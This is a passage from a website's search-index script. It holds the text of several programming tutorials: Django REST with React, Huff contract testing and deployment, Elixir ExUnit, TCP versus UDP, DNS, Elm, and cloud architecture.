go ahead and make migrations. Note that every time you make changes to the models.py file, we will need to make migrations. Use the below command to do so:\npython manage.py makemigrations\nNow let’s apply all migrations using the below command:\npython manage.py migrate Now we can test to see that the CRUD operations work on the todo model file using the Admin site (or, the interface). For this, we will need to register the models in the admin.py file.\nStep 15: Open up the admin.py file and add up the following code in it:\nfrom django.contrib import admin # import the model Todo from .models import Todo # create a class for the admin-model integration class TodoAdmin(admin.ModelAdmin): # add the fields of the model here list_display = (\"title\",\"description\",\"completed\") # we will need to register the # model class and the Admin model class # using the register() method # of admin.site class admin.site.register(Todo,TodoAdmin) Now let’s create a superuser using the below command:\npython manage.py createsuperuser\nHere we will be using the following credentials:\nUsername: Geeks Email address: geeks@geeksforgeeks.org Password:12345 Note: You can set up your credentials as per your need. The above credentials need not be the same.\nNow let’s run the server and check everything is going as intended so far using the below command:\npython manage.py runserver Creating the API: linkTo create the API we will need to install the Django REST Framework for Serializers. We also need Django-cors-headers for whitelisting port 3000, which is the default port for React.\nNow follow the below steps to create the Django REST framework:\nStep 1: To install the Django REST framework use the below command in the backend directory:\npip install djangorestframework\nStep 2: Now install the Django-cors-headers using the below command:\npip install django-cors-headers\nStep 3: Now open up the setting.py file and add both the dependencies that we just installed to INSTALLED_APPS as shown below:\nINSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'todo', 'corsheaders', 'rest_framework', ] Step 4: Also in the settings.py file we need to whitelist the localhost port 3000. If we don’t do that there will be a block between the localhost:8000 and localhost:3000. Add the following code to achieve the same:\n# White listing the localhost:3000 port # for React CORS_ORIGIN_WHITELIST = ( 'http://localhost:3000', ) Step 5: In the MIDDLEWARE section we need to add the cors-headers settings as shown below:\nMIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'corsheaders.middleware.CorsMiddleware' ] At this point, our settings.py would look like below:\nfrom pathlib import Path # Build paths inside the project like this: BASE_DIR / 'subdir'. BASE_DIR = Path(__file__).resolve().parent.parent # Quick-start development settings - unsuitable for production # See https://docs.djangoproject.com/en/3.2/howto/deployment/checklist/ # SECURITY WARNING: keep the secret key used in production secret! SECRET_KEY = 'django-insecure-_c3!4)8+yce2l-ju@gz@b6(e0$00y@xhx7+lxk1p==k+pyqko3' # SECURITY WARNING: don't run with debug turned on in production! DEBUG = True ALLOWED_HOSTS = [] # Application definition INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'todo', 'corsheaders', 'rest_framework', ] MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'corsheaders.middleware.CorsMiddleware' ] ROOT_URLCONF = 'backend.urls' TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] WSGI_APPLICATION = 'backend.wsgi.application' # Database # https://docs.djangoproject.com/en/3.2/ref/settings/#databases DATABASES = { 'default': { 'ENGINE': 'django.db.backends.sqlite3', 'NAME': BASE_DIR / 'db.sqlite3', } } # Password validation # https://docs.djangoproject.com/en/3.2/ref/settings/#auth-password-validators AUTH_PASSWORD_VALIDATORS = [ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, { 'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator', }, { 'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', }, ] # White listing the localhost:3000 port CORS_ORIGIN_WHITELIST = ( 'http://localhost:3000' ) # Internationalization # https://docs.djangoproject.com/en/3.2/topics/i18n/ LANGUAGE_CODE = 'en-us' TIME_ZONE = 'UTC' USE_I18N = True USE_L10N = True USE_TZ = True # Static files (CSS, JavaScript, Images) # https://docs.djangoproject.com/en/3.2/howto/static-files/ STATIC_URL = '/static/' # Default primary key field type # https://docs.djangoproject.com/en/3.2/ref/settings/#default-auto-field DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField' Now we need to create the Serializers for the Todo data Model. The Serializers are responsible for converting model instances to JSON. This will help the frontend to work with the received data easily. JSON is the standard for data interchange on the web.\nStep 6: Now create a file inside the todo folder and name it serializers.py. Inside the folder add the following code:\n# import serializers from the REST framework from rest_framework import serializers # import the todo data model from .models import Todo # create a serializer class class TodoSerializer(serializers.ModelSerializer): # create a meta class class Meta: model = Todo fields = ('id', 'title','description','completed') Step 7: Now it’s time to create the Views. So open up the views.py file. Now add the following code to the file:\nfrom django.shortcuts import render # import view sets from the REST framework from rest_framework import viewsets # import the TodoSerializer from the serializer file from .serializers import TodoSerializer # import the Todo model from the models file from .models import Todo # create a class for the Todo model viewsets class TodoView(viewsets.ModelViewSet): # create a serializer class and # assign it to the TodoSerializer class serializer_class = TodoSerializer # define a variable and populate it # with the Todo list objects queryset = Todo.objects.all() Step 8: Now open up the urls.py file and add the following code to it.\nfrom django.contrib import admin # add include to the path from django.urls import path, include # import views from todo from todo import views # import routers from the REST framework # it is necessary for routing from rest_framework import routers # create a router object router = routers.DefaultRouter() # register the router router.register(r'tasks',views.TodoView, 'task') urlpatterns = [ path('admin/', admin.site.urls), # add another path to the url patterns # when you visit the localhost:8000/api # you should be routed to the django Rest framework path('api/', include(router.urls)) ] This is the final step for creating the REST API and we can now perform all CRUD operations. Routers allow us to make queries. For example, if we go the “tasks”, this will return the list of all the tasks. Also, you can have a single ‘task’ with an id to return a single task, where id is the primary key.\nCreating UI linkNow let’s build the frontend for our Todo app. For this follow the below steps:\nStep 1: Navigate to the main project directory(ie, Django-react-app) and activate the virtual environment using the below command:\ndar\\Scripts\\activate.bat Step 2: Now use the below command to create a boilerplate of React js app:\nnpx create-react-app frontend Step 3: So, use the below command to install reactstrap and bootstrap in the project:\nnpm install reactstrap bootstrap\nStep 4: First move into the Frontend folder and use the below command to run the React server to make sure everything if working till this point:\nnpm start If everything is fine, you’ll get the following page on the localhost:3000\nStep 5: Now open up the App.js file in the frontend folder. And clear the boilerplate code and change it to the below code:\nJavascript import \"./App.css\"; function App() { return Welcome to Geeksforgeeks!; } export default App; At this point the frontend will look like below:\nAs you can see in the above image. Any changes made to the App.js file are reflected directly to the UI.\nStep 6: Now the code to the App.js file. Comments are added to the code for better understanding.\n// import Component from the react module import React, { Component } from \"react\"; import Modal from \"./components/Modal\"; import axios from 'axios'; // create a class that extends the component class App extends Component { // add a constructor to take props constructor(props) { super(props); // add the props here this.state = { // the viewCompleted prop represents the status // of the task. Set it to false by default viewCompleted: false, activeItem: { title: \"\", description: \"\", completed: false }, // this list stores all the completed tasks taskList: [] }; } // Add componentDidMount() componentDidMount() { this.refreshList(); } refreshList = () =\u003e { axios //Axios to send and receive HTTP requests .get(\"http://localhost:8000/api/tasks/\") .then(res =\u003e this.setState({ taskList: res.data })) .catch(err =\u003e console.log(err)); }; // this arrow function takes status as a parameter // and changes the status of viewCompleted to true // if the status is true, else changes it to false displayCompleted = status =\u003e { if (status) { return this.setState({ viewCompleted: true }); } return this.setState({ viewCompleted: false }); }; // this array function renders two spans that help control // the set of items to be displayed(ie, completed or incomplete) renderTabList = () =\u003e { return ( "
            }
        );
    index.add(
            {
                id:  229 ,
                href: "\/tutorials\/docs\/technical-architecture\/",
                title: "Technical Architecture",
                description: "Best blogs out there.",
                content: ""
            }
        );
    index.add(
            {
                id:  230 ,
                href: "\/tutorials\/docs\/huff\/huff\/testing_and_deploying_huff_contracts\/",
                title: "Testing and Deploying Huff Contracts",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "In this tutorial, we will delve into the steps involved in testing and deploying a smart contract written using the Huff programming language.\nIntroduction to Huff linkFor those unfamiliar with Huff, it is a low-level programming language designed for developing highly optimized smart contracts that run on the Ethereum Virtual Machine (EVM). Huff exposes the inner workings of the EVM, allowing developers to manually manipulate its programming stack.\nThe Aztec Protocol team originally created Huff to write Weierstrudel, an on-chain elliptical curve arithmetic library requiring incredibly optimized code that neither Solidity nor Yul could provide.\nThe Math Contract linkWe will use a simple Huff contract that performs basic math operations like addition, subtraction, multiplication, etc.\n#define macro ADD_NUMBERS() = takes (2) returns (1) { // Input stack: // [num2, num1] add // [num2 + num1] } #define macro SUB_NUMBERS() = takes (2) returns (1) { // Input stack: // [num2, num1] swap1 // [num1, num2] sub // [num1 - num2] } #define macro MULTIPLY_NUMBERS() = takes (2) returns (1) { // Input stack: // [num2, num1] mul // [num2 * num1] } #define macro DIVIDE_NUMBERS() = takes (2) returns (1) { // Input stack: // [num2, num1] swap1 // [num1, num2] div // [num1 / num2] } #define macro ABS() = takes (2) returns (1) { // Input stack: // [num2, num1] dup1 dup3 lt iszero swapAndSubtract jumpi sub complete jump swapAndSubtract: swap1 sub complete: } The above implementation is very basic, and there is plenty of room for improvements, but that’s a topic for another day.\nTesting the Contract linkWe can test the above contract in two ways: using Foundry and using Huff tests.\nUsing Foundry linkTo test the above logic using Foundry, we need to deploy the wrapper contract, as it exposes the functions. We also need to use the HuffDeployer helper contract from the foundry-huff library.\nHere’s how the tests should be set up:\nDefine the interface of the contract (IMath). Deploy the wrapper contract in the setUp() method using the HuffDeployer. Cast the returned address to the IMath interface. Write tests as usual. /// Import HuffDeployer import {HuffDeployer} from \"foundry-huff/HuffDeployer.sol\"; contract MathTest is Test { IMath public math; function setUp() public { address addr = HuffDeployer.deploy( \"../test/foundry/wrappers/MathWrapper\" ); math = IMath(addr); } function testAddNumbers() public { uint256 result = math.addNumbers(420, 69); assertEq(result, 489); } function testAddNumbers_fuzz(uint256 a, uint256 b) public { unchecked { uint256 c = a + b; if (c \u003e MAX) { vm.expectRevert(); math.addNumbers(a, b); return; } uint256 result = math.addNumbers(a, b); assertEq(result, a + b); } } function testSubNumbers() public { uint256 result = math.subNumbers(420, 69); assertEq(result, 351); } // Add more tests as needed... } Huff Tests linkTesting Huff contracts using Foundry is the most commonly used method. However, we can also write simpler (and faster) unit tests using Huff itself. The Huff compiler (huffc) has a test command, which takes the filename containing the tests as an argument. We can use the TestHelpers utility created by Maddiaa for basic operations like ASSERT, etc.\nA sample Huff test contract looks like this:\n// ./test/huff/Math.t.huff /* Imports */ #include \"./helpers/TestHelpers.huff\" #include \"../../src/Math.huff\" /* Tests */ #define test TEST_ADD() = { 0x01 // [1] 0x02 // [2,1] ADD_NUMBERS() // [sum] 0x03 // [3,sum] ASSERT_EQ() // [3 == sum] 0x4563918244f40000 // [5e18] 0x4563918244f40000 // [5e18, 5e18] ADD_NUMBERS() // [SUM] 0x8ac7230489e80000 // [10e18, SUM] ASSERT_EQ() // [10e18 == SUM] } We can run the tests using the command:\n$ huffc ./test/Math.t.huff test Deploying Huff Contracts linkWe have seen how to test Huff contracts using Foundry and Huff. Now, we will move on to the next step: deploying the Huff contract to an EVM-based blockchain (Goerli, in this case). Here’s the Foundry script to deploy the MathWrapper contract:\n// scripts/DeployMath.s.sol // SPDX-License-Identifier: Unlicense pragma solidity ^0.8.15; import \"foundry-huff/HuffDeployer.sol\"; import \"forge-std/Script.sol\"; import {IMath} from \"../src/interfaces/IMath.sol\"; contract Deploy is Script { function run() public returns (IMath math) { math = IMath(HuffDeployer.broadcast(\"wrappers/MathWrapper\")); console2.log(\"MathWrapper contract deployed to: \", address(math)); } } The above script can be executed by running the following command:\n$ source .env \u0026\u0026 forge script scripts/DeployMath.s.sol:DeployMath --fork-url $RPC_URL --private-key $PRIVATE_KEY --broadcast You need to configure the RPC_URL of the network and PRIVATE_KEY of the deployer in the .env file.\nTo validate the deployment, you can either add assertions in the script’s run() method or implement fork tests with the deployed contract address.\nWe have successfully tested and deployed our simple Math.huff contract. You can follow the same process to test and deploy more complex Huff contracts as well.\n"
            }
        );
    index.add(
            {
                id:  231 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/testing_with_elixir\/",
                title: "Testing in Elixir with ExUnit",
                description: "Testing is a crucial aspect of software development that ensures code reliability and correctness. Elixir provides a powerful testing framework, ExUnit, which comes with a rich set of features for writing and running tests. This tutorial will cover the basics of ExUnit, writing test cases, using mocks and stubs, and property-based testing with StreamData.\nIntroduction to ExUnit linkExUnit is Elixir’s built-in test framework, providing a comprehensive suite of tools to write and execute tests.",
                content: "Testing is a crucial aspect of software development that ensures code reliability and correctness. Elixir provides a powerful testing framework, ExUnit, which comes with a rich set of features for writing and running tests. This tutorial will cover the basics of ExUnit, writing test cases, using mocks and stubs, and property-based testing with StreamData.\nIntroduction to ExUnit linkExUnit is Elixir’s built-in test framework, providing a comprehensive suite of tools to write and execute tests. It includes features like assertions, refutations, setup callbacks, and more.\nSetting Up ExUnit linkExUnit is included by default in new Elixir projects. To start using ExUnit, ensure that your project is properly set up by following these steps:\nCreate a new Elixir project:\nmix new my_project cd my_project Ensure ExUnit starts automatically by adding the following to your test/test_helper.exs file:\nExUnit.start() Writing Test Cases linkA basic test case in ExUnit is defined using the test macro within a defmodule. Here’s an example:\nCreate a test file test/my_project_test.exs:\ndefmodule MyProjectTest do use ExUnit.Case doctest MyProject test \"the truth\" do assert 1 + 1 == 2 end end Run the tests:\nmix test Assertions and Refutations linkExUnit provides several macros for assertions and refutations:\nassert: Asserts that an expression evaluates to true. refute: Asserts that an expression evaluates to false. Example:\ntest \"assertions and refutations\" do assert String.length(\"hello\") == 5 refute String.length(\"hello\") == 4 end Structuring Test Suites linkOrganize tests in separate modules and use setup callbacks for shared test setup:\nCreate a file test/user_test.exs: defmodule UserTest do use ExUnit.Case setup do {:ok, user: %User{name: \"John\", age: 30}} end test \"user has a name\", %{user: user} do assert user.name == \"John\" end end Mocks and Stubs linkUsing mocks and stubs allows you to isolate tests by replacing external dependencies with controlled behavior. The Mox library is commonly used in Elixir for this purpose.\nAdd mox to your mix.exs dependencies:\ndefp deps do [ {:mox, \"~\u003e 1.0\"} ] end Define a behaviour and create a mock in test/support/mocks.ex:\ndefmodule MyApp.ServiceBehaviour do @callback call(any()) :: any() end Mox.defmock(MyApp.ServiceMock, for: MyApp.ServiceBehaviour) Use the mock in your tests:\ndefmodule MyApp.ServiceTest do use ExUnit.Case, async: true import Mox setup :verify_on_exit! test \"service call\" do MyApp.ServiceMock |\u003e expect(:call, fn _ -\u003e :ok end) assert MyApp.Service.call(:arg) == :ok end end Property-based Testing with StreamData linkProperty-based testing is a powerful technique where properties (general truths) about the code are defined and tested with many different inputs. The StreamData library facilitates this in Elixir.\nAdd stream_data to your mix.exs dependencies:\ndefp deps do [ {:stream_data, \"~\u003e 0.5\"} ] end Write property-based tests:\ndefmodule MyApp.PropertyTest do use ExUnit.Case use ExUnitProperties property \"list reversal\" do check all list \u003c- list_of(integer()) do assert Enum.reverse(Enum.reverse(list)) == list end end end Conclusion linkExUnit provides a robust and flexible framework for testing Elixir applications. By leveraging its features, you can ensure your code is reliable, maintainable, and free of bugs. Integrating additional tools like Mox and StreamData further enhances your testing capabilities, enabling comprehensive and thorough test coverage.\nHappy testing!\nThis comprehensive guide should serve as a useful resource for developers looking to improve their Elixir testing practices.\n"
            }
        );
    index.add(
            {
                id:  232 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/tcp_vs_udp\/",
                title: "The Difference Between TCP and UDP",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "The internet is a vast network of data transfers happening all the time. These transfers are governed by two main protocols: TCP and UDP. Each one has its strengths and weaknesses, making them suitable for different situations.\nWhat are Protocols?\nProtocols are basically the rules that dictate how data is formatted and sent over a network. TCP and UDP are two different ways to achieve the same goal: transferring data online. They allow devices and servers to communicate for various activities like browsing websites, sending emails, playing games, and more.\nTCP vs. UDP: A Breakdown\nHere’s a table summarizing the key differences between TCP and UDP:\nFactor TCP UDP Connection Type Requires a connection beforehand No connection needed Data Sequence Can sequence data (ordered transfer) Cannot sequence data (disorderly transfer) Retransmission Retransmits lost data packets Does not retransmit lost data packets Delivery Guaranteed delivery Delivery not guaranteed Error Checking Thorough error checking Minimal error checking Broadcasting Not supported Supported Speed Slower, but complete data delivery Faster, but risk of incomplete data Choosing the Right Protocol\nThe best protocol depends on what you’re doing online and the type of data being transferred.\nUse TCP for: Reliable data transfer where order and accuracy are crucial. Examples include emails, file transfers, and web browsing. Use UDP for: Real-time data where speed is more important than perfect delivery. Examples include online gaming, live streaming, and video chat. Advantages and Disadvantages\nTCP Advantages:\nReliable data transfer Guaranteed delivery Error checking TCP Disadvantages:\nSlower speeds Overhead for connection establishment UDP Advantages:\nFaster speeds Lower overhead Suitable for broadcasting UDP Disadvantages:\nUnreliable data transfer No guaranteed delivery No error checking How They Work\nTCP: Uses a three-way handshake to establish a connection, ensuring data arrives correctly and in order. Think of it like carefully handing a package to someone. UDP: Fires data packets at the receiver without a handshake, making it faster but less reliable. Imagine throwing the package across the room – it might arrive, but not necessarily in good shape. Analogy: Reliable vs. Fast Delivery\nImagine delivering a sandwich to a friend. TCP is like walking it over for guaranteed delivery. UDP is like throwing it – faster but with a chance of damage.\nIn Conclusion\nBoth TCP and UDP are essential for smooth internet operation. TCP provides reliable data transfer, while UDP prioritizes speed. Understanding their differences helps you choose the right protocol for your online activities.\n"
            }
        );
    index.add(
            {
                id:  233 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/domain_name_system\/",
                title: "The Domain Name System",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "What is DNS? linkThe Domain Name System (DNS) acts as the Internet’s phonebook. Humans access information online using domain names like nytimes.com or espn.com, but web browsers communicate through Internet Protocol (IP) addresses. DNS translates these domain names into IP addresses, allowing browsers to load the correct internet resources. This eliminates the need for users to memorize complex IP addresses, such as 192.168.1.1 for IPv4 or 2400:cb00:2048:1::c629:d7a2 for IPv6.\nHow Does DNS Work? linkDNS resolution converts a hostname (e.g., www.example.com) into a computer-friendly IP address (e.g., 192.168.1.1). Each device on the Internet has a unique IP address, which functions like a street address, guiding data to the correct destination. When a user wants to load a webpage, a translation must occur between the domain name typed into the browser and the IP address of the server hosting the website.\nComponents Involved in DNS Resolution linkDNS resolution involves several hardware components that a DNS query must pass through. These components operate behind the scenes without user interaction, ensuring efficient name-to-IP address translation.\n1. DNS Recursor linkThe DNS recursor acts like a librarian tasked with finding a specific book. It receives queries from client machines (such as web browsers) and makes additional requests to satisfy the DNS query.\n2. Root Nameserver linkThe root nameserver is the first step in translating human-readable host names into IP addresses. It acts as an index in a library, pointing to more specific locations.\n3. TLD Nameserver linkThe top-level domain (TLD) nameserver can be compared to a specific rack of books in a library. It hosts the last portion of a hostname (e.g., the “com” in example.com).\n4. Authoritative Nameserver linkThe authoritative nameserver is the final stop in the DNS query chain. It can be thought of as a dictionary on a library rack, translating a specific name into its definition. If the authoritative nameserver has the requested record, it returns the IP address to the DNS recursor, completing the query.\nDifference Between Authoritative DNS Server and Recursive DNS Resolver linkRecursive DNS Resolver linkA recursive DNS resolver responds to a recursive request from a client by tracking down the DNS record. It makes a series of requests until it reaches the authoritative DNS nameserver or returns an error if no record is found. Caching helps reduce the number of requests by serving the requested resource record earlier in the DNS lookup process.\nAuthoritative DNS Server linkAn authoritative DNS server holds and is responsible for DNS resource records. It responds with the queried resource record, allowing the web browser to reach the IP address needed to access a website. This server can provide responses from its own data without querying another source.\nSteps in a DNS Lookup link8 Steps in a DNS Lookup link User Request: A user types ‘example.com’ into a web browser. DNS Recursive Resolver: The query is received by a DNS recursive resolver. Root Nameserver: The resolver queries a DNS root nameserver. TLD Nameserver: The root server responds with the address of the TLD DNS server (e.g., .com). Domain’s Nameserver: The resolver makes a request to the TLD server. IP Address Retrieval: The TLD server responds with the IP address of the domain’s nameserver. Final Query: The resolver sends a query to the domain’s nameserver. Response: The domain’s nameserver returns the IP address to the resolver. Once the DNS lookup returns the IP address, the browser makes an HTTP request to the IP address, and the server returns the webpage to be rendered in the browser.\nWhat is a DNS Resolver? linkThe DNS resolver is the first stop in the DNS lookup process, dealing with the client that made the initial request. It starts the sequence of queries that lead to the translation of a URL into an IP address.\nTypes of DNS Queries link Recursive Query: The DNS client requires the DNS server to respond with the requested resource record or an error message. Iterative Query: The DNS client allows the DNS server to return the best answer it can. If there is no match, the server provides a referral to a DNS server authoritative for a lower level of the domain namespace. Non-Recursive Query: This occurs when a DNS resolver client queries a DNS server for a record it has access to, either because it is authoritative for the record or it exists in its cache. DNS Caching linkCaching temporarily stores data to improve performance and reliability. DNS caching involves storing DNS data closer to the requesting client to resolve queries more quickly and reduce bandwidth consumption. Caching can occur at various levels, including:\nBrowser DNS Caching: Modern web browsers cache DNS records to reduce the number of steps needed to resolve a query. Operating System (OS) Level DNS Caching: The OS-level DNS resolver checks its cache before sending a DNS query to the Internet service provider (ISP). Example: Steps in a DNS Lookup with Caching link Browser Cache Check: The browser checks its DNS cache for the requested record. OS Cache Check: If the record is not found, the OS-level resolver checks its cache. ISP Resolver Check: If the OS-level cache does not have the record, the request is sent to the ISP’s DNS recursive resolver. By understanding the DNS process and the roles of different components, users and administrators can ensure efficient and reliable access to internet resources.\n"
            }
        );
    index.add(
            {
                id:  234 ,
                href: "\/tutorials\/docs\/elm\/elm\/elm_architecture\/",
                title: "The Elm Architecture",
                description: "Understanding The Elm Architecture for building robust web applications.",
                content: "Elm Architecture linkThe Elm Architecture is a pattern for architecting interactive programs, like webapps and games.\nThis architecture seems to emerge naturally in Elm. Rather than someone inventing it, early Elm programmers kept discovering the same basic patterns in their code. It was kind of spooky to see people ending up with well-architected code without planning ahead!\nSo The Elm Architecture is easy in Elm, but it is useful in any front-end project. In fact, projects like Redux have been inspired by The Elm Architecture, so you may have already seen derivatives of this pattern. Point is, even if you ultimately cannot use Elm at work yet, you will get a lot out of using Elm and internalizing this pattern.\nComponents of The Elm Architecture linkTEA revolves around three main concepts: Model, Update, and View. Together, these components create a unidirectional data flow that is easy to understand and debug.\nModel linkThe model represents the state of your application. It’s a data structure (like a record) that contains all the information needed to render your app.\ntype alias Model = { message : String } Update linkThe update function is where you define how your application responds to different messages (or actions). It takes a message and the current model, and returns an updated model.\ntype Msg = UpdateMessage String update : Msg -\u003e Model -\u003e Model update msg model = case msg of UpdateMessage newMessage -\u003e { model | message = newMessage } View linkThe view function takes the current model and returns HTML. Elm uses a virtual DOM, which makes updating the view very efficient.\nview : Model -\u003e Html Msg view model = Html.text model.message Simple Application Example linkLet’s put these concepts together in a simple Elm application. The application will display a message and update it when a button is clicked.\nmodule Main exposing (..) import Browser import Html exposing (Html, button, div, text) import Html.Events exposing (onClick) -- MODEL type alias Model = { message : String } initModel : Model initModel = { message = \"Hello, Elm!\" } -- UPDATE type Msg = UpdateMessage update : Msg -\u003e Model -\u003e Model update msg model = case msg of UpdateMessage -\u003e { model | message = \"Button clicked!\" } -- VIEW view : Model -\u003e Html Msg view model = div [] [ text model.message , button [ onClick UpdateMessage ] [ text \"Click me!\" ] ] -- MAIN main = Browser.sandbox { init = initModel , view = view , update = update } In this program, clicking the button triggers an UpdateMessage, which updates the model’s message. The view then reflects this change.\nAdvanced Topics in TEA linkAs you become more familiar with TEA, you can explore its advanced features, which include handling side effects, managing complex state, and integrating with JavaScript.\nHandling Side Effects linkIn Elm, side effects (like HTTP requests) are managed in a controlled way using commands (Cmd). The Elm Architecture handles these commands to perform side effects and then routes the results back to your application.\ntype Msg = FetchData | ReceiveData String update : Msg -\u003e Model -\u003e (Model, Cmd Msg) update msg model = case msg of FetchData -\u003e (model, fetchDataCmd) ReceiveData data -\u003e ({ model | data = data }, Cmd.none) Managing Complex State linkFor more complex applications, you can split your model and update logic into smaller parts. This approach helps in managing state more effectively and keeps your codebase organized.\nIntegrating with JavaScript linkElm allows you to integrate with JavaScript using ports. Ports enable communication between Elm and JavaScript, allowing you to leverage JavaScript libraries and functionality within your Elm application.\nport module Main exposing (..) port alert : String -\u003e Cmd msg update : Msg -\u003e Model -\u003e (Model, Cmd Msg) update msg model = case msg of AlertMessage -\u003e (model, alert \"This is an alert!\") Understanding and mastering The Elm Architecture will enable you to build robust, maintainable, and scalable web applications in Elm.\n"
            }
        );
    index.add(
            {
                id:  235 ,
                href: "\/tutorials\/docs\/technical-architecture\/technical-architecture\/the_role_of_cloud_services\/",
                title: "The Role of Cloud Services in Modern Technical Architecture",
                description: "Cloud services have become a cornerstone of modern technical architecture. They provide the flexibility, scalability, and cost-efficiency that businesses need to stay competitive. This post will explore how cloud services can be integrated into technical architecture, the benefits they offer, and an overview of the major cloud providers.\nBenefits of Cloud Computing link1. Flexibility and Agility linkCloud services offer unparalleled flexibility, allowing businesses to quickly adapt to changing demands. Whether it’s scaling resources up or down, deploying new applications, or experimenting with new technologies, the cloud provides the agility needed to respond to market dynamics efficiently.",
                content: "Cloud services have become a cornerstone of modern technical architecture. They provide the flexibility, scalability, and cost-efficiency that businesses need to stay competitive. This post will explore how cloud services can be integrated into technical architecture, the benefits they offer, and an overview of the major cloud providers.\nBenefits of Cloud Computing link1. Flexibility and Agility linkCloud services offer unparalleled flexibility, allowing businesses to quickly adapt to changing demands. Whether it’s scaling resources up or down, deploying new applications, or experimenting with new technologies, the cloud provides the agility needed to respond to market dynamics efficiently.\n2. Scalability linkScalability is one of the most significant advantages of cloud computing. Traditional on-premises infrastructure requires significant investment and time to scale, whereas cloud services can instantly scale resources based on demand. This is particularly beneficial for businesses with variable workloads, ensuring that they only pay for what they use.\n3. Cost-Efficiency linkCloud computing eliminates the need for substantial upfront capital expenditure on hardware and software. Instead, businesses can opt for a pay-as-you-go model, reducing operational costs. Additionally, cloud providers often offer pricing models that include discounts for long-term commitments or reserved instances, further enhancing cost-efficiency.\n4. Reliability and Availability linkLeading cloud providers offer robust infrastructure with high availability and reliability. They have data centers distributed across various geographic regions, providing redundancy and failover capabilities. This ensures minimal downtime and business continuity even in the face of hardware failures or natural disasters.\n5. Security linkCloud providers invest heavily in security measures, offering advanced security features that many organizations might find challenging to implement on their own. These include encryption, identity and access management (IAM), threat detection, and compliance with various industry standards and regulations.\n6. Innovation and Speed linkThe cloud accelerates innovation by providing access to a wide array of services and technologies. From artificial intelligence and machine learning to Internet of Things (IoT) and serverless computing, cloud platforms enable businesses to experiment and deploy new solutions quickly, keeping them ahead of the competition.\nOverview of Major Cloud Providers link1. Amazon Web Services (AWS) linkOverview: Amazon Web Services (AWS) is the largest and most comprehensive cloud platform, offering over 200 fully featured services from data centers globally. AWS provides a broad range of services, including computing power, storage options, and advanced functionalities such as artificial intelligence and machine learning.\nKey Services:\nCompute: Amazon EC2, Lambda Storage: S3, EBS, Glacier Database: RDS, DynamoDB, Redshift AI/ML: SageMaker, Rekognition, Lex IoT: IoT Core, Greengrass Benefits:\nExtensive global reach with numerous data centers. Comprehensive service offerings catering to various needs. Strong ecosystem with a vast marketplace of third-party integrations. 2. Microsoft Azure linkOverview: Microsoft Azure is a leading cloud platform known for its strong integration with Microsoft products and services. Azure provides a wide range of cloud services, including those for computing, analytics, storage, and networking.\nKey Services:\nCompute: Azure Virtual Machines, Azure Functions Storage: Blob Storage, Disk Storage Database: Azure SQL Database, Cosmos DB AI/ML: Azure Machine Learning, Cognitive Services IoT: Azure IoT Hub, IoT Central Benefits:\nSeamless integration with Microsoft enterprise solutions like Office 365 and Dynamics 365. Hybrid cloud capabilities with Azure Stack. Strong support for open-source technologies. 3. Google Cloud Platform (GCP) linkOverview: Google Cloud Platform (GCP) is known for its expertise in data analytics, machine learning, and artificial intelligence. GCP offers a suite of cloud services designed to help businesses leverage Google’s infrastructure and technological prowess.\nKey Services:\nCompute: Compute Engine, Cloud Functions Storage: Cloud Storage, Persistent Disk Database: Cloud SQL, Bigtable, Firestore AI/ML: AI Platform, Vision AI, AutoML IoT: Cloud IoT Core Benefits:\nAdvanced data analytics and machine learning capabilities. Competitive pricing and innovative pricing models. Strong performance in handling large-scale data workloads. Integrating Cloud Services into Technical Architecture linkStep 1: Assess Your Needs linkDetermine your specific requirements and goals. Consider factors such as application performance, scalability, security, compliance, and budget.\nStep 2: Choose the Right Cloud Provider linkEvaluate the offerings of AWS, Azure, and GCP based on your needs. Consider factors such as service availability in your region, specific service offerings, pricing models, and existing integrations with your technology stack.\nStep 3: Design Your Cloud Architecture linkDesign a cloud architecture that aligns with your technical and business requirements. This may involve:\nCompute Resources: Choosing the appropriate compute services (e.g., VMs, containers, serverless). Storage Solutions: Selecting storage services based on performance, durability, and cost. Networking: Configuring networks, subnets, and security groups to ensure secure and efficient communication. Security and Compliance: Implementing security best practices and ensuring compliance with relevant regulations. Step 4: Implement CI/CD Pipelines linkImplement Continuous Integration and Continuous Deployment (CI/CD) pipelines to automate the deployment process. Use tools like Jenkins, GitLab CI, or Azure DevOps to streamline the integration, testing, and deployment of your applications.\nStep 5: Monitor and Optimize linkUse monitoring tools provided by the cloud provider (e.g., AWS CloudWatch, Azure Monitor, Google Stackdriver) to track the performance and health of your applications. Regularly review and optimize your cloud infrastructure to ensure cost-efficiency and performance.\nBest Practices for Maintaining Cloud Architecture link Implement Automation: 